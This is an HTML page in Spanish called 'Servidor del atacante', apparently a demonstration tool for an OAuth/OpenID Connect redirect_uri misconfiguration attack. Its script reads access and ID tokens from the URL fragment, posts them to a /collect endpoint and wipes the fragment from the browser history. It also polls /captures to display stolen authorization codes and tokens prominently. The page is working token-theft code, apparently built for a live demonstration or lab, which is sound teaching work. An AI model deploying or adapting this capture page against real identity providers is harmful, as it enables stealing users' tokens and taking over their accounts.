<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Servidor del atacante</title>
  <style>
    html { background: #2e0c0c; min-height: 100%; }
    :root { color-scheme: dark; }
    body { font-family: system-ui, sans-serif; max-width: 1000px; margin: 1.5rem auto;
           padding: 0 1.2rem; background: radial-gradient(1200px 560px at 50% -8%, #7a1d1d, #2e0c0c) fixed; color: #e5e5e5; }
    h1 { color: #ff5555; font-size: 1.9rem; margin: 0 0 .2rem; }
    .sub { color: #999; margin: 0 0 1.5rem; }
    .idle { color: #666; font-style: italic; padding: 2rem 0; }

    /* Hero: la ultima captura, enorme, para que se vea desde el fondo. */
    .hero { display: none; border: 2px solid #ff3b3b; border-radius: 14px;
            background: linear-gradient(180deg,#2a0d0d,#160707); padding: 1.4rem 1.6rem;
            margin-bottom: 1.6rem; box-shadow: 0 0 40px #ff3b3b33; }
    .hero.show { display: block; animation: pop .35s ease-out; }
    @keyframes pop { from { transform: scale(.96); opacity: .4 } to { transform: scale(1); opacity: 1 } }
    .banner { display: inline-block; background: #ff3b3b; color: #160707; font-weight: 800;
              letter-spacing: .5px; padding: .3rem .8rem; border-radius: 999px; font-size: 1rem; }
    .hero .label { color: #ff9e9e; font-size: .95rem; margin: 1rem 0 .3rem; text-transform: uppercase;
                   letter-spacing: 1px; }
    .hero .value { font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
                   font-size: 1.9rem; font-weight: 700; color: #fff; word-break: break-all;
                   background: #00000055; padding: .6rem .8rem; border-radius: 10px; line-height: 1.3; }
    .hero .meta { color: #ffb3b3; font-size: .9rem; margin-top: .8rem; }

    h2 { font-size: 1.1rem; color: #ccc; border-bottom: 1px solid #333; padding-bottom: .3rem; }
    .entry { border-left: 3px solid #ff5555; padding-left: .8rem; margin: .7rem 0; }
    .kind { color: #ffb86c; font-weight: 700; }
    .ts { color: #888; font-size: .8rem; }
    pre { background: #161616; border: 1px solid #333; padding: .7rem; border-radius: 8px;
          overflow-x: auto; font-size: .82rem; margin: .3rem 0 0; }
    .live { float: right; font-size: .8rem; color: #4ade80; }
    .live .dot { display: inline-block; width: 9px; height: 9px; border-radius: 50%;
                 background: #4ade80; margin-right: 5px; animation: blink 1.1s infinite; }
    @keyframes blink { 50% { opacity: .25 } }
  </style>
</head>
<body>
  <span class="live"><span class="dot"></span>en vivo</span>
  <h1>Servidor del atacante &mdash; :8082</h1>
  <p class="sub">Pagina trampa. Todo lo que el OP mal configurado entregue aca queda registrado.</p>

  <div id="hero" class="hero">
    <span class="banner">⚠ CODE INTERCEPTADO</span>
    <div class="label" id="heroLabel">authorization code</div>
    <div class="value" id="heroValue">—</div>
    <div class="meta" id="heroMeta"></div>
  </div>

  <div id="idle" class="idle">Esperando que el OP entregue algo&hellip;</div>

  <h2 id="listTitle" style="display:none">Capturas (<span id="count">0</span>)</h2>
  <div id="list"></div>

  <script>
    const esc = s => String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));

    function heroFor(e) {
      if (e.code) return { label: 'authorization code', value: e.code };
      if (e.access_token) return { label: 'access_token', value: e.access_token };
      if (e.id_token) return { label: 'id_token', value: e.id_token };
      return null;
    }

    async function tick() {
      let data;
      try { data = await (await fetch('/captures')).json(); }
      catch (e) { return; }

      document.getElementById('idle').style.display = data.length ? 'none' : 'block';
      document.getElementById('listTitle').style.display = data.length ? 'block' : 'none';
      document.getElementById('count').textContent = data.length;

      // Hero = ultima captura con algo jugoso.
      const hero = document.getElementById('hero');
      let h = null;
      for (let i = data.length - 1; i >= 0; i--) { h = heroFor(data[i]); if (h) { var src = data[i]; break; } }
      if (h) {
        const prev = document.getElementById('heroValue').textContent;
        document.getElementById('heroLabel').textContent = h.label;
        document.getElementById('heroValue').textContent = h.value;
        document.getElementById('heroMeta').textContent =
          `capturado ${src.ts} · robado del redirect_uri del atacante`;
        hero.className = 'hero show';
        if (prev !== h.value) { hero.classList.remove('show'); void hero.offsetWidth; hero.classList.add('show'); }
      } else {
        hero.className = 'hero';
      }

      document.getElementById('list').innerHTML = data.slice().reverse().map(e => `
        <div class="entry">
          <span class="ts">${esc(e.ts)}</span> &middot; <span class="kind">${esc(e.kind)}</span>
          <pre>${esc(JSON.stringify(e.data, null, 2))}</pre>
        </div>`).join('');
    }

    // Caso 2: token en el #fragment -> robarlo y mandarlo al server.
    if (window.location.hash && window.location.hash.length > 1) {
      const frag = {};
      new URLSearchParams(window.location.hash.substring(1)).forEach((v, k) => frag[k] = v);
      fetch('/collect', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(frag) });
      history.replaceState(null, '', window.location.pathname);
    }

    tick();
    setInterval(tick, 3000);
  </script>
</body>
</html>
